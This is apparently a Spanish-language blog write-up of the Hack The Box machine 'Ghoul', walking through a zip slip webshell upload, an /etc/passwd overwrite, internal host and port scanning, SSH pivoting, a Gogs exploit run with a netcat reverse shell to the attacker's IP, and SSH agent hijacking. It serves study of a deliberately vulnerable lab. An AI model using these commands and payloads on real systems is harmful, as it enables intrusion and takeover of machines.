<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>HTB-Ghoul - creep33.github.io</title>
<meta name="description" content="WriteUp con metodología de la máquina Ghoul.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="creep33.github.io">
<meta property="og:title" content="HTB-Ghoul">
<meta property="og:url" content="http://localhost:4000/HTB-Ghoul/">


  <meta property="og:description" content="WriteUp con metodología de la máquina Ghoul.">



  <meta property="og:image" content="http://localhost:4000/assets/images/WriteUps/Ghoul.png">





  <meta property="article:published_time" content="2021-12-15T00:00:00+01:00">





  

  


<link rel="canonical" href="http://localhost:4000/HTB-Ghoul/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "creep33",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="creep33.github.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Posts</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Tags</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">HTB-Ghoul</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="creep33" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">creep33</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cibersecurity and<br>Ethical Hacking Student
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/creep33" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="HTB-Ghoul">
    <meta itemprop="description" content="WriteUp con metodología de la máquina Ghoul.">
    <meta itemprop="datePublished" content="December 15, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">HTB-Ghoul
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-15T00:00:00+01:00">December 15, 2021 </time> 
          
          
        </p>
        <center><img src="/assets/images/WriteUps/Ghoul.png"></center>

<p>IP -&gt; 10.10.10.101</p>

<h1 id="reconocimiento">Reconocimiento</h1>
<h2 id="nmap">Nmap</h2>
<p>Utilizamos <a href="/Nmap/">nmap</a> y obtenemos los siguientes resultados.</p>

<p><a href="/assets/files/WriteUps/Ghoul.txt">Ghoul Nmap Result</a></p>

<h2 id="http808080">http(80,8080)</h2>
<p>Con <a href="/Nmap/">nmap</a> utilizamos el script <strong>http-enum</strong> para fuzzear rutas.
Pero no descubre nada</p>

<p>Con <a href="/whatweb/">whatweb</a> escaneamos los servicios.</p>

<blockquote>
  <p>80: Servicio Apache
8080: 401 Unauthorized -&gt; Necesitamos credenciales</p>
</blockquote>

<h2 id="http-80">http (80)</h2>
<p>Con <a href="/CeWl/">CeWl</a> nos montamos un diccionario con las palabras que aparecen en la web.
Fuzzeamos rutas con herramientas como <a href="/wfuzz/">wfuzz</a> o <a href="/gobuster/">gobuster</a>.</p>

<blockquote>
  <p>/css
/images -&gt; 403 Forbbiden
/js
/archives -&gt; 403 Forbbiden
/users -&gt; Login Panel
/uploads -&gt; 403 Forbbiden</p>
</blockquote>

<p>Como vemos recursos en php, buscamos archivos con extensión “php”.</p>

<blockquote>
  <p>secret.php -&gt; Chat con una posible contraseña.</p>
</blockquote>

<h2 id="http-8080">http (8080)</h2>
<p>Probamos credenciales por defecto.</p>

<blockquote>
  <p>USER: admin
PASS: admin</p>
</blockquote>

<p>Tenemos paneles de subida de “imagenes” y archivos “zip”.</p>
<ul>
  <li>Probamos a subir un php con una webshell</li>
</ul>

<p>Pero nos reporta que solo acepta imagenes “jpeg”. Vamos a interceptar la petición con Burpsuite para ver como se tramita la petición y modificarla.</p>
<ul>
  <li>Subimos una imagen legítima jpeg para ver como se comporta.</li>
</ul>

<p>Se sube pero no sabemos dónde se suben las imágenes.</p>
<ul>
  <li>Con burpsuite modificamos el content type a una imagen jpeg “image/jpeg” para subir la webshell con php.</li>
</ul>

<p>Pero nos reporta un error. Aunque todavía no sabemos dónde se suben las imágenes. Por otro lado podemos subir un zip, podemos tratar de explotar la vulnerabilidad “zip slip”.</p>

<h3 id="zip-slip">zip slip</h3>
<p>Creamos una archivo en el directorio “/var/www/html” para comprimir “../../../../../../../../var/www/html/cmd.php” con una webshell. Al subirlo, como lo descomprime, lo extrae en la ruta que le hemos indicado.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip cmd.zip ../../../../../../../../var/www/html/cmd.php
</code></pre></div></div>

<blockquote>
  <p>Tenemos WebShell</p>
</blockquote>

<p>Nos enviamos una reverse shell. Pero nos encontramos en un contenedor.</p>

<h1 id="container-escape-17220010">Container Escape (172.20.0.10)</h1>
<h2 id="os">OS</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span>
</code></pre></div></div>

<blockquote>
  <p>El archivo “cmd.php” lo crea root.</p>
</blockquote>

<p>Vamos a sobreescribir el archivo “passwd”, con una contraseña para root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd
hola
hola
</code></pre></div></div>

<p>Tenemos que crear el archivo passwd malicioso pero antes tenemos que guardar el nuestro jeje.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /etc/passwd /etc/passwd.original
<span class="nb">rm</span> 
/etc/passwd
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano /etc/passwd

root:PVXo7amSxXehk:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38: Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,, :/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
kaneki:x:1000:1000::/home/kaneki:/bin/bash
Eto:x:1001:1001::/home/Eto:/bin/bash
noro:x:1002:1002::/home/noro:/bin/bash
</code></pre></div></div>

<p>Volvemos a tirar de la vulnerabilidad <strong>zip slip</strong> para sobrescribir el passwd del contenedor.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
hola
</code></pre></div></div>

<blockquote>
  <p>Somo root en el contenedor</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home
<span class="nb">ls
cd</span> /Eto
<span class="nb">cat </span>alert.txt
<span class="nb">cd</span> ../kaneki
<span class="nb">cat </span>notes
<span class="nb">cat </span>user.txt
<span class="nb">cd</span> /var/www/html
<span class="nb">grep</span> <span class="nt">-r</span> <span class="nt">-i</span> <span class="s2">"password"</span> | <span class="nb">head</span> <span class="nt">-n</span> 8
</code></pre></div></div>

<blockquote>
  <p>Vuln in Gogs
Crededentials -&gt; $logins array(‘kaneki’ =&gt; ‘123456’, ‘noro’ =&gt; ‘password123’, ‘admin’ =&gt; ‘abcdef’);</p>
</blockquote>

<blockquote>
  <p>user.txt</p>
</blockquote>

<h2 id="http">http</h2>
<p>Probamos a iniciar sesión en el panel de inicio de sesión del puerto 80</p>

<h2 id="os-1">OS</h2>
<p>Como está utilizando com CMS un <a href="/Apache-Tomcat/">Apache Tomcat</a>, buscamos credenciales hardcodeadas en el archivo “users.xml”</p>

<blockquote>
  <p>Credentials -&gt; &lt;!–&lt;user username=”admin” password=”test@aogiri123” roles=”admin” /&gt;</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home
find <span class="se">\-</span>name authorized_keys | xargs <span class="nb">cat</span> <span class="nt">-n</span>
<span class="nb">cat </span>kaneki/.ssh/id_rsa
</code></pre></div></div>

<blockquote>
  <p>Vemos que hay un host “kaneki-pc” que no es el de la máquina.
La clave esta protegida con contraseña</p>
</blockquote>

<p>Pero podemos tratar de romperla con <strong>ssh2john.py</strong>, el <strong>john</strong> y el <strong>rockyou.txt</strong>. Pero no consigue extraer la contraseña. Recordamos que tenemos una contraseña de aquel char en secret.php. Consigue romper el hash.</p>

<blockquote>
  <p>FILE: id_rsa
PASS: ILoveTouka</p>
</blockquote>

<p>Iniciamos con ssh para poder hacer port-forwarding fácilmente. El usuario “root” tambien tiene una “id_rsa”, y en “authorized_keys” vemos otra vez el hostname “kaneki-pc”. Iniciamos como “root” por <strong>ssh</strong>.
Ahora vamos a por ese equipo. Para encontrarlo vamos a realizar un descubrimiento de hosts desde la máquina víctima.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch </span>hostDiscovery.sh
<span class="nb">chmod</span> +x hostDiscovery.sh
vi hostDiscovery.sh
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 172.20.0.</span><span class="nv">$i</span><span class="s2">"</span> &amp;&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[+] 172.20.0.</span><span class="nv">$i</span><span class="s2"> - ACTIVE"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hostDiscovery.sh
<span class="nb">hostname</span> <span class="nt">-I</span>
</code></pre></div></div>

<blockquote>
  <p>172.20.0.150 - OPEN</p>
</blockquote>

<p>Ahora vamos a buscar puertos abiertos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch </span>portDiscovery.sh
<span class="nb">chmod</span> +x portDiscovert.sh
vim portDiscovert.sh
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 65535<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/172.20.0.150/</span><span class="nv">$port</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[+] </span><span class="nv">$port</span><span class="s2"> - OPEN"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</code></pre></div></div>

<blockquote>
  <p>22 - OPEN</p>
</blockquote>

<p>Podemos tratar a conectarnos en la otra máquina con nuestra id_rsa de kaneki. Pero nos pide una clave para id_rsa. Tenemos la clave para la id_rsa.
Para conectarnos directamente a la máquina desde nuestra máquina de atacante, hacemos un <strong>local port forwarding con ssh</strong> hasta nuestro equipo.</p>

<p>En 172.20.0.10:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa kaneki_pub@172.20.0.150 <span class="nt">-L</span> 2000:172.20.0.150:22
</code></pre></div></div>

<p>En localhost:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa root@10.10.10.101 <span class="nt">-L</span> 2000:127.0.0.1:2000
</code></pre></div></div>

<p>Ya tenemos en nuestro equipo un servicio <strong>ssh</strong> en el puerto 2000 que llega hasta la 172.20.0.150</p>

<h1 id="container-escape-172200150-172180200">Container Escape (172.20.0.150, 172.18.0.200)</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls
cat </span>to-do.txt
<span class="nb">cd</span> /home
<span class="nb">ls</span> <span class="nt">-l</span>
<span class="nb">cd</span> /
<span class="nb">uname</span> <span class="nt">-a</span> 
<span class="nb">cat</span> /etc/os-release
<span class="nb">hostname</span> <span class="nt">-I</span>
</code></pre></div></div>

<blockquote>
  <p>USER: AogiriTest
Ubuntu 18.04.1 LTS
Tenemos 2 interfaces y un segento de red nuevo</p>
</blockquote>

<p>Volvemos ha hacer reconocimiento de hosts.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch </span>hostDiscovery.sh
<span class="nb">chmod</span> +x hostDiscovery.sh
vi hostDiscovery.sh
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 172.18.0.</span><span class="nv">$i</span><span class="s2">"</span> &amp;&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[+] 172.18.0.</span><span class="nv">$i</span><span class="s2"> - ACTIVE"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hostDiscovery.sh
</code></pre></div></div>

<blockquote>
  <p>127.18.0.2</p>
</blockquote>

<p>Ahora vamos a buscar puertos abiertos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch </span>portDiscovery.sh
<span class="nb">chmod</span> +x portDiscovert.sh
vim portDiscovert.sh
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 65535<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/172.18.0.2/</span><span class="nv">$port</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[+] </span><span class="nv">$port</span><span class="s2"> - OPEN"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</code></pre></div></div>

<blockquote>
  <p>22 - OPEN
3000 - OPEN</p>
</blockquote>

<p>Vamos a traernos el puerto 3000 a nuestra máquina con ssh</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa kaneki_pub@127.0.0.1 <span class="nt">-p2000</span> <span class="nt">-L</span> 3000:127.18.0.2:3000
</code></pre></div></div>

<p>Ya tenemos acceso al gogs</p>

<h2 id="gogs">Gogs</h2>
<p>Nos piden credenciales de acceso. En el “to-do.txt” teníamos un usuario, y tambien tenemos distintas contraseñas almacenadas, probamos contraseñas para el usuario y entramos.</p>

<blockquote>
  <p>USER: AogiriTest
PASS: test@aogiri123</p>
</blockquote>

<p>Como antes hablaban de gogs, buscamos en google “gogs exploit github” y clonamos el repo para enviarnos una reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/TheZ3ro/gogsownz
<span class="nb">cd </span>gogsownz
python3 gogsownz.py <span class="nt">-v</span> http:/127.0.0.1:3000/ <span class="nt">-C</span> <span class="s2">"AogiriTest:test@aogiri123"</span> <span class="nt">-n</span> <span class="s2">"i_like_gogits"</span> <span class="nt">--rce</span> <span class="s2">"nc 10.10.14.29 443 -e /bin/bash"</span> <span class="nt">--cleanup</span>
</code></pre></div></div>

<h1 id="container-escape-1721802">Container Escape (172.18.0.2)</h1>
<h2 id="os-2">OS</h2>
<p>Como no podemos hacer un tratamiento de la tty, nos conectamos mediante ssh con el uso de claves id_rsa</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
sudo</span> <span class="nt">-l</span>
<span class="nb">uname</span> <span class="nt">-a</span>
<span class="nb">cat</span> /etc/os-release
<span class="nb">cd</span> / 
find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
</code></pre></div></div>

<blockquote>
  <p>Alpine 3.8
gosu es SUID y el propietario es root</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gosu root <span class="nb">whoami</span> <span class="c">#root</span>
gosu root bash
<span class="nb">cd</span> /root
<span class="nb">ls
cat </span>session.sh
</code></pre></div></div>

<blockquote>
  <p>credenciales -&gt; ‘user_name=kaneki&amp;password=12345ILoveTouka!!!’
7z file -&gt; Nos lo traemos a nuestro equipo</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z x aogiri-app.7z
<span class="nb">cd </span>aogiri-chatapp
git log
git reflog
git show &lt;identifier&gt;
</code></pre></div></div>

<blockquote>
  <p>Es un repositorio git</p>
</blockquote>

<blockquote>
  <p>USER: kaneki
PASS: jT7Hr$.[nF.)c)4C</p>
</blockquote>

<blockquote>
  <p>USER: root
PASS: g_xEN$ZuWD7hJf2G</p>
</blockquote>

<p>Probamos las credenciales en la máquina (172.20.0.150) ya que es la única que no hemos rooteado. Y somos root</p>

<h1 id="container-escape-rooted-172200150-172180200">Container Escape rooted (172.20.0.150, 172.18.0.200)</h1>
<h2 id="os-3">OS</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root
<span class="nb">ls 
cat </span>root.txt
<span class="nb">cd</span> /tmp
<span class="nb">ls
rm</span> <span class="nt">-r</span> ssh<span class="se">\*</span>
watch <span class="nt">-n</span> 1 ps <span class="nt">-faux</span>
</code></pre></div></div>

<blockquote>
  <p>Vemos sesiones ssh -&gt; probamos a monitorizar a ver si se gestionas sesiones
Vemos que nos crea una sesión a la máquina 127.18.0.1 por ssh como root -&gt; Podemos hacer un agent hijacking</p>
  <div class="language-bash highlighter-rouge">
<div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>ssh-<span class="se">\*</span>
<span class="nb">ls</span> <span class="c"># agent.896</span>
<span class="nv">SSH_AUTH_SOCK</span><span class="o">=</span>agent.896 ssh root@172.18.0.1 <span class="nt">-p</span> 2222
</code></pre></div>  </div>
</blockquote>

<h1 id="1721801">172.18.0.1</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root
<span class="nb">cat </span>root.txt
</code></pre></div></div>

<blockquote>
  <p>root.txt</p>
</blockquote>

<h1 id="information">Information</h1>
<p>Este archivo se ha ido creando durante todo el proceso de resolución de la máquina, es una buena práctica cuando nos enfrentamos a contenedores y varias IP, para ir monitorizándo</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.20.0.1
172.20.0.10 <span class="o">(</span>PWNED<span class="o">)</span> <span class="o">(</span>rooted<span class="o">)</span>
172.20.0.150 <span class="o">(</span>22/tcp<span class="o">)</span> <span class="o">(</span>PWNED<span class="o">)</span> <span class="o">(</span>rooted<span class="o">)</span>
	172.18.0.200 <span class="o">(</span>172.20.0.150<span class="o">)</span>
	127.18.0.1
	127.18.0.2 <span class="o">(</span>22/tcp, 3000/tcp<span class="o">)</span> <span class="o">(</span>PWNED<span class="o">)</span> <span class="o">(</span>rooted<span class="o">)</span>
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">HTB</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#writeups" class="page__taxonomy-item" rel="tag">WriteUps</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-12-15T00:00:00+01:00">December 15, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/HTB-Fuse/" class="pagination--pager" title="HTB-Fuse
">Previous</a>
    
    
      <a href="/HTB-Reel2/" class="pagination--pager" title="HTB-Reel2
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 creep33</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
